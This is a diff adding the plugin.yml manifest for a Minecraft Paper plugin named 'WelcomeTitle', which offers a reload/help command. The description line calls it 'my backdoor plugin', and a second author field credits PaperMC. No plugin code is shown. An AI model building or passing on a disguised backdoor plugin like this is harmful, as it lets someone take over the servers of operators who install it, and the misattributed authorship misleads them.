@@ -1,0 +1,12 @@
+name: WelcomeTitle
+version: 1.0.0
+author: hello12324
+main: io.papermc.testplugin.TestPlugin
+description: this is my backdoor plugin
+author: PaperMC
+website: https://papermc.io
+api-version: '1.20'
+commands:
+  WelcomeTitle:
+    description: Manage the WelcomeTitle plugin.
+    usage: /<command> [reload/help]
